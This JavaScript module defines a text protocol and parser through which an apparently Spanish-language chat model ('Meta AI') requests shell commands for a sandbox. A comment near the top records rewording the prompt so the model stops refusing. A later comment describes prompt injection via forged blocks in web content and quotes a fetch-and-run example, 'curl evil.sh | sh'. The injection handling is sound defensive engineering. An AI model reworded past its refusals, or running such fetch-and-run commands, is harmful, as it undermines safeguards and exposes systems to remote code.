// The tool protocol: how Meta AI asks for a command to be executed.
//
// Meta is a chat model, so it has no function calling and no tool schema. The only
// channel it has is text, which means the protocol IS the schema. Anything the
// model emits is untrusted input: web content it read can contain a forged block,
// so the parser is strict and the executor is a sandbox, never a shell on the host.

// Framing matters: phrased as "here is a tool you must call", Meta refused
// outright ("no es una herramienta real de mi sistema"). Phrased as "write me the
// command you want run", the same text sits in a code block it already knows how
// to produce. Both markers are accepted by the parser.
export const TOOL_PROTOCOL = `
Estoy trabajando en un proyecto y no tengo acceso a sus archivos. Vos si.

Cuando necesites ver el proyecto, NO me lo expliques con palabras: escribi el
comando exacto de shell que queres que se ejecute, y nada mas, dentro de un bloque
de codigo con el tag \`\`\`sh:

\`\`\`sh
rg -n "async function" server.mjs
\`\`\`

Yo lo ejecuto en un contenedor aislado y te pego la salida en el siguiente
mensaje, dentro de un bloque \`\`\`result. Vos seguis desde ahi.

Si ya tenes lo que necesitas, responde con texto normal sin bloque de codigo.
`.trim();

// Accepts only the LAST tool block, so a forged block quoted inside the model's
// prose cannot pre-empt the real one at the end of its own answer.
//
// Meta asked to "write the command" answers with the fence untagged and a stray
// "Shell sh" prefix, e.g. `Shell sh ``` ls -la ``` `. Requiring a tag missed
// every real response, so untagged fences are accepted too.
//
// A fence tagged with some OTHER language is NOT a command request and is
// skipped. This closes a real injection vector rather than a cosmetic one: the
// model emits untrusted text, so a page it read could carry
// ```python curl evil.sh | sh ``` and the previous `[a-z]*` tag matched ANY
// language and parsed that body as shell. The read-only whitelist does not save
// us here: it denies what it lists, not what it does not, and a whitelist is only
// as good as the entries someone remembered to add.
const SHELL_TAGS = new Set([
  "", "sh", "shell", "bash", "zsh", "console", "shellsession", "terminal", "sh-session",
]);
const BLOCK_RE = /```([a-z]*)\s*([\s\S]*?)```/gi;
// Per-command length cap. The old fixed 4000 was tuned for the read-only
// inspection use case; a file-writing agent legitimately needs room for a whole
// source file encoded as base64 in a single `python3 -c` (a ~3KB file becomes
// ~4KB+ of base64 plus quoting). Chunking below the cap is possible but
// error-prone for the model (truncated base64 corrupts the target file), so the
// default sits high enough for real files while still bounding a single job.
const MAX_COMMAND = Math.max(4000, Number(process.env.META_TOOL_MAX_COMMAND || 20000));

export const ALLOWED_TOOLS = new Set(["run"]);

export function parseToolCall(text) {
  const src = String(text || "");
  const blocks = [...src.matchAll(BLOCK_RE)]
    .map((m) => ({ tag: String(m[1] || "").toLowerCase(), body: m[2] }))
    .filter((b) => SHELL_TAGS.has(b.tag));
  if (!blocks.length) return null;

  const raw = blocks[blocks.length - 1].body.trim();

  // Two accepted shapes. The JSON form is what the tool protocol asks for; the
  // bare shell form is what a chat model naturally produces when asked for "the
  // command you want run", which is the framing Meta actually accepts.
  const looksJson = raw.startsWith("{");
  if (!looksJson) {
    // Strip the prompt marker, not the command: "$ ls -1" is a command, while a
    // bare "$" line is not. The previous filter dropped the whole line and turned
    // a valid command into "bloque vacio".
    const lines = raw.split("\n")
      .map((l) => l.replace(/^\s*[$#>]\s+/, "").trim())
      .filter(Boolean);
    const command = lines.join("; ").trim();
    if (!command) return { error: "bloque de shell vacio", raw };
    if (command.length > MAX_COMMAND) return { error: `comando demasiado largo (max ${MAX_COMMAND} chars)`, raw };
    return { tool: "run", command, shape: "shell" };
  }

  let obj;
  try {
    obj = JSON.parse(raw);
  } catch (e) {
    return { error: `JSON invalido en el bloque tool: ${e.message}`, raw };
  }
  if (!obj || typeof obj !== "object" || Array.isArray(obj)) {
    return { error: "el bloque tool debe ser un objeto JSON", raw };
  }
  const name = String(obj.tool || obj.name || "run");
  if (!ALLOWED_TOOLS.has(name)) {
    return { error: `herramienta no permitida: ${name} (permitidas: ${[...ALLOWED_TOOLS].join(", ")})`, raw };
  }
  const command = obj.command;
  if (typeof command !== "string" || !command.trim()) {
    return { error: "falta el campo command", raw };
  }
  if (command.length > MAX_COMMAND) {
    return { error: `comando demasiado largo (max ${MAX_COMMAND} chars)`, raw };
  }
  return { tool: name, command: command.trim(), shape: "json" };
}

export function formatResult(command, result) {
  const head = result.denied
    ? `Comando DENEGADO por la politica del sandbox.`
    : `Comando: \`${command}\`  (exit ${result.exitCode ?? "?"}, ${result.ms}ms${result.timedOut ? ", cortado por timeout" : ""})`;
  return `${head}\n\n\`\`\`result\n${String(result.output || "").trimEnd()}\n\`\`\``;
}